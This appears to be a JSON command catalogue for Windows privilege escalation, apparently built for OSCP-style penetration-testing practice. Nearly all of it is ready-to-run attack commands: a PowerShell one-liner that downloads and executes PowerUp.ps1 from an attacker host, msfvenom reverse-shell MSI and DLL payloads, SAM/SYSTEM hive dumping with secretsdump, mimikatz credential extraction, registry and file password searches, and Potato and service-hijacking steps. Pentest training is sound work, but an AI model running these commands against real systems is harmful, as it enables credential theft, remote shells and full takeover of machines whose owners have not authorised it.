{
  "category": "post-exploit",
  "subcategory": "windows",
  "description": "Windows privilege escalation commands and techniques",
  "commands": [
    {
      "id": "win-privesc-winpeas",
      "name": "WinPEAS - Automated Enumeration",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "winPEASany.exe",
      "description": "Comprehensive automated privilege escalation enumeration for Windows",
      "variables": [],
      "flag_explanations": {
        "quiet": "Reduce output verbosity",
        "cmd": "Execute specific checks only",
        "notcolor": "Disable colored output"
      },
      "tags": ["AUTOMATED", "QUICK_WIN", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Red/yellow highlighted vulnerabilities",
        "Unquoted service paths found",
        "AlwaysInstallElevated detected",
        "AutoLogon credentials discovered"
      ],
      "failure_indicators": [
        "Antivirus blocks execution",
        "Insufficient permissions"
      ],
      "next_steps": [
        "Focus on RED findings first",
        "Test unquoted service paths",
        "Check AlwaysInstallElevated if enabled"
      ],
      "alternatives": [
        "PowerUp.ps1 for PowerShell-based enum",
        "Windows-Exploit-Suggester",
        "Manual enumeration commands"
      ],
      "notes": "Transfer via certutil, PowerShell download, or SMB share"
    },
    {
      "id": "win-privesc-powerup",
      "name": "PowerUp - PowerShell Enumeration",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks\"",
      "description": "PowerShell-based privilege escalation scanner",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP hosting PowerUp.ps1",
          "example": "10.10.14.5",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ep bypass": "Bypass execution policy",
        "-c": "Execute command",
        "IEX": "Invoke-Expression (run downloaded script)",
        "Invoke-AllChecks": "Run all PowerUp checks"
      },
      "tags": ["AUTOMATED", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Service abuse opportunities found",
        "DLL hijacking paths discovered",
        "Registry autologon credentials"
      ],
      "failure_indicators": [
        "Execution policy blocks script",
        "Cannot download from LHOST",
        "AMSI blocks PowerShell"
      ],
      "next_steps": [
        "Run Invoke-ServiceAbuse if vulnerable service found",
        "Use Write-ServiceBinary for DLL hijacking",
        "Extract credentials from output"
      ],
      "alternatives": [
        "Upload PowerUp.ps1 and import locally",
        "Use individual PowerUp functions",
        "WinPEAS if PowerShell is blocked"
      ],
      "notes": "Part of PowerSploit framework - download from GitHub"
    },
    {
      "id": "win-systeminfo",
      "name": "System Information Gathering",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "systeminfo && hostname && whoami /all",
      "description": "Gather basic system information for privilege escalation planning",
      "variables": [],
      "flag_explanations": {
        "systeminfo": "Display detailed system configuration",
        "hostname": "Display computer name",
        "whoami /all": "Display user, groups, and privileges"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "OS version and patch level shown",
        "User privileges displayed",
        "Group memberships listed"
      ],
      "failure_indicators": [
        "Command not found (unusual)"
      ],
      "next_steps": [
        "Search OS version for kernel exploits",
        "Check for SeImpersonate privilege (potato exploits)",
        "Note missing patches"
      ],
      "alternatives": [
        "wmic os get Caption,CSDVersion,OSArchitecture",
        "Get-ComputerInfo (PowerShell)"
      ],
      "notes": "SeImpersonate/SeAssignPrimaryToken = Potato exploit candidates"
    },
    {
      "id": "win-unquoted-service-paths",
      "name": "Find Unquoted Service Paths",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\"",
      "description": "Find services with unquoted paths containing spaces (exploitable)",
      "variables": [],
      "flag_explanations": {
        "wmic service get": "Query service properties",
        "findstr /i auto": "Filter for auto-start services (case-insensitive)",
        "findstr /i /v": "Exclude lines containing pattern",
        "/v \"\"\"\"": "Exclude properly quoted paths"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Services with unquoted paths found",
        "Paths contain spaces",
        "Services run as SYSTEM"
      ],
      "failure_indicators": [
        "All services properly quoted",
        "No auto-start services with spaces"
      ],
      "next_steps": [
        "Check write permissions on path directories",
        "Create malicious executable in exploitable path",
        "Restart service to trigger payload"
      ],
      "alternatives": [
        "PowerUp's Get-UnquotedService",
        "Manual check with: sc qc <servicename>"
      ],
      "notes": "Example: C:\\Program Files\\My Service\\service.exe tries C:\\Program.exe first"
    },
    {
      "id": "win-weak-service-perms",
      "name": "Check Service Permissions",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
      "description": "Find services with weak permissions (modifiable by current user)",
      "variables": [],
      "flag_explanations": {
        "-u": "Suppress errors",
        "-w": "Show only objects with write access",
        "-c": "Check services",
        "-q": "Omit banner",
        "-v": "Verbose output"
      },
      "tags": ["MANUAL", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Services with SERVICE_ALL_ACCESS found",
        "SERVICE_CHANGE_CONFIG permissions",
        "Writable service binaries"
      ],
      "failure_indicators": [
        "accesschk.exe not found",
        "No weak permissions found"
      ],
      "next_steps": [
        "Modify service binary path with sc config",
        "Replace service executable",
        "Restart service for code execution"
      ],
      "alternatives": [
        "PowerUp's Get-ModifiableServiceFile",
        "icacls to check file permissions",
        "Get-Acl in PowerShell"
      ],
      "notes": "Download accesschk from Sysinternals or use PowerShell alternatives"
    },
    {
      "id": "win-always-install-elevated",
      "name": "Check AlwaysInstallElevated",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      "description": "Check if AlwaysInstallElevated is enabled (allows MSI as SYSTEM)",
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry key",
        "HKCU": "HKEY_CURRENT_USER registry hive",
        "HKLM": "HKEY_LOCAL_MACHINE registry hive",
        "/v": "Query specific value"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Both keys set to 0x1",
        "AlwaysInstallElevated = 1 in both hives"
      ],
      "failure_indicators": [
        "Keys not found",
        "Value set to 0"
      ],
      "next_steps": [
        "Generate malicious MSI with msfvenom",
        "Execute: msiexec /quiet /qn /i payload.msi",
        "Payload runs as SYSTEM"
      ],
      "alternatives": [
        "PowerUp's Get-RegistryAlwaysInstallElevated",
        "Manual MSI creation with WiX Toolset"
      ],
      "notes": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > payload.msi"
    },
    {
      "id": "win-registry-autologon",
      "name": "Search Registry for Passwords",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s",
      "description": "Search registry for stored passwords (autologon, VNC, etc.)",
      "variables": [],
      "flag_explanations": {
        "/f password": "Search for 'password' string",
        "/t REG_SZ": "Search in string values only",
        "/s": "Search recursively"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "AutoAdminLogon passwords found",
        "VNC passwords discovered",
        "Putty session credentials"
      ],
      "failure_indicators": [
        "No passwords in registry",
        "Access denied on sensitive keys"
      ],
      "next_steps": [
        "Decode VNC passwords if found",
        "Try credentials with runas",
        "Use for lateral movement"
      ],
      "alternatives": [
        "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"",
        "Get-ItemProperty for PowerShell"
      ],
      "notes": "Check specifically: Winlogon, VNC, Putty, SNMP keys"
    },
    {
      "id": "win-scheduled-tasks",
      "name": "Enumerate Scheduled Tasks",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "schtasks /query /fo LIST /v && dir C:\\windows\\system32\\tasks",
      "description": "List scheduled tasks that may be exploitable",
      "variables": [],
      "flag_explanations": {
        "/query": "Display scheduled tasks",
        "/fo LIST": "Format as list",
        "/v": "Verbose output",
        "dir tasks": "List task files directly"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Tasks running as SYSTEM found",
        "Writable task files",
        "Tasks with modifiable binaries"
      ],
      "failure_indicators": [
        "Access denied",
        "No exploitable tasks"
      ],
      "next_steps": [
        "Check if task binary is writable",
        "Look for missing binaries in task",
        "Create malicious binary in task path"
      ],
      "alternatives": [
        "Get-ScheduledTask in PowerShell",
        "accesschk on task binaries"
      ],
      "notes": "Pay attention to tasks with SYSTEM privileges and writable paths"
    },
    {
      "id": "win-dll-hijacking",
      "name": "DLL Hijacking Opportunities",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\*.dll 2>nul | findstr /v \"C:\\Windows\" && echo Check PATH directories",
      "description": "Find potential DLL hijacking opportunities",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search subdirectories, bare format",
        "C:\\*.dll": "Find all DLL files",
        "findstr /v": "Exclude Windows directory"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Applications loading DLLs from writable paths",
        "Missing DLLs in application directory",
        "Writable directories in PATH"
      ],
      "failure_indicators": [
        "All DLLs in protected locations",
        "No write access to DLL paths"
      ],
      "next_steps": [
        "Use Process Monitor to find missing DLLs",
        "Create malicious DLL with msfvenom",
        "Place DLL in application directory"
      ],
      "alternatives": [
        "PowerUp's Find-ProcessDLLHijack",
        "Process Monitor (procmon) from Sysinternals"
      ],
      "notes": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > evil.dll"
    },
    {
      "id": "win-potato-exploits",
      "name": "Check for Potato Exploit Eligibility",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"",
      "description": "Check for privileges needed for Potato-family exploits",
      "variables": [],
      "flag_explanations": {
        "whoami /priv": "List user privileges",
        "findstr /i": "Case-insensitive search",
        "SeImpersonate": "Impersonate a client after authentication",
        "SeAssignPrimaryToken": "Replace process-level token"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "SeImpersonate privilege enabled",
        "SeAssignPrimaryToken privilege enabled",
        "Running as service account"
      ],
      "failure_indicators": [
        "Privileges not present",
        "Running as regular user"
      ],
      "next_steps": [
        "Use JuicyPotato for Windows < 2019",
        "Use PrintSpoofer for Windows 10/2019+",
        "Use RoguePotato as alternative"
      ],
      "alternatives": [
        "JuicyPotato.exe -l 1337 -p cmd.exe -t *",
        "PrintSpoofer.exe -i -c cmd",
        "GodPotato, SweetPotato variants"
      ],
      "notes": "IIS, SQL Server service accounts commonly have these privileges"
    },
    {
      "id": "win-kernel-exploits",
      "name": "Check for Kernel Exploits",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database <DATE>-mssb.xls --systeminfo systeminfo.txt",
      "description": "Identify missing patches and applicable kernel exploits",
      "variables": [
        {
          "name": "<DATE>",
          "description": "Date of exploit database",
          "example": "2024-01-15",
          "required": true
        }
      ],
      "flag_explanations": {
        "--database": "Microsoft security bulletin database",
        "--systeminfo": "Path to systeminfo output"
      },
      "tags": ["AUTOMATED", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Missing patches identified",
        "Applicable exploits listed",
        "High-priority vulnerabilities found"
      ],
      "failure_indicators": [
        "System fully patched",
        "No public exploits available"
      ],
      "next_steps": [
        "Download suggested exploit",
        "Compile if necessary",
        "Test exploit carefully"
      ],
      "alternatives": [
        "Watson (PowerShell-based)",
        "Sherlock.ps1 for older Windows",
        "Manual searchsploit of OS version"
      ],
      "notes": "Update database: python windows-exploit-suggester.py --update"
    },
    {
      "id": "win-saved-credentials",
      "name": "Check Saved Credentials",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "cmdkey /list && dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* && dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
      "description": "Find saved Windows credentials that can be reused",
      "variables": [],
      "flag_explanations": {
        "cmdkey /list": "List saved credentials",
        "AppData\\Local\\Credentials": "Local credential storage",
        "AppData\\Roaming\\Credentials": "Roaming credential storage"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Saved credentials found",
        "Administrator credentials cached",
        "Network share credentials"
      ],
      "failure_indicators": [
        "No saved credentials",
        "Credentials encrypted"
      ],
      "next_steps": [
        "Use runas /savecred with found credentials",
        "Extract credentials with mimikatz",
        "Use for lateral movement"
      ],
      "alternatives": [
        "mimikatz: vault::list",
        "rundll32 keymgr.dll,KRShowKeyMgr"
      ],
      "notes": "runas /savecred /user:DOMAIN\\Admin \"cmd.exe\" if admin creds cached"
    },
    {
      "id": "win-password-files",
      "name": "Search for Password Files",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\*password* C:\\*cred* C:\\*vnc* C:\\*.config 2>nul | findstr /v \"[System32 SysWOW64]\"",
      "description": "Search filesystem for files potentially containing passwords",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search subdirectories, bare format",
        "C:\\*password*": "Files with 'password' in name",
        "findstr /v": "Exclude system directories"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Password files found in user directories",
        "Configuration files with credentials",
        "VNC password files"
      ],
      "failure_indicators": [
        "No interesting files found",
        "Files encrypted or protected"
      ],
      "next_steps": [
        "Read files for cleartext passwords",
        "Decode VNC passwords",
        "Check .config files for connection strings"
      ],
      "alternatives": [
        "findstr /si password *.txt *.xml *.ini",
        "PowerShell: Get-ChildItem -Recurse | Select-String -Pattern 'password'"
      ],
      "notes": "Also check: unattend.xml, sysprep.inf, web.config"
    },
    {
      "id": "win-sam-system-backup",
      "name": "Check for SAM/SYSTEM Backups",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\SAM C:\\SYSTEM 2>nul && reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM system.hiv",
      "description": "Find or create SAM/SYSTEM backups for offline password cracking",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search for existing backups",
        "reg save": "Create registry hive backup",
        "HKLM\\SAM": "Security Accounts Manager hive",
        "HKLM\\SYSTEM": "System hive (contains boot key)"
      },
      "tags": ["MANUAL", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "SAM/SYSTEM files found or created",
        "Files successfully saved",
        "Read permissions on files"
      ],
      "failure_indicators": [
        "Access denied on reg save",
        "Files locked by system"
      ],
      "next_steps": [
        "Transfer files to attacker machine",
        "Extract hashes with secretsdump.py",
        "Crack with hashcat or john"
      ],
      "alternatives": [
        "Copy from C:\\Windows\\Repair\\",
        "Copy from Volume Shadow Copies",
        "Use mimikatz lsadump::sam"
      ],
      "notes": "secretsdump.py -sam sam.hiv -system system.hiv LOCAL"
    },
    {
      "id": "win-group-membership",
      "name": "Check Privileged Group Membership",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "net user <USERNAME> && net localgroup administrators && whoami /groups",
      "description": "Check user's group memberships for privilege escalation opportunities",
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Username to check",
          "example": "currentuser",
          "required": false
        }
      ],
      "flag_explanations": {
        "net user": "Display user account information",
        "net localgroup": "Display members of local group",
        "whoami /groups": "Display current user's groups"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "User in Administrators group",
        "Backup Operators membership",
        "Server Operators membership"
      ],
      "failure_indicators": [
        "Only standard user groups",
        "No privileged memberships"
      ],
      "next_steps": [
        "If Backup Operators: use backup privileges",
        "If Server Operators: modify services",
        "If Admin with UAC: bypass UAC"
      ],
      "alternatives": [
        "Get-LocalGroupMember in PowerShell",
        "Check domain groups: net user /domain"
      ],
      "notes": "Backup Operators can read any file, Server Operators can modify services"
    }
  ]
}
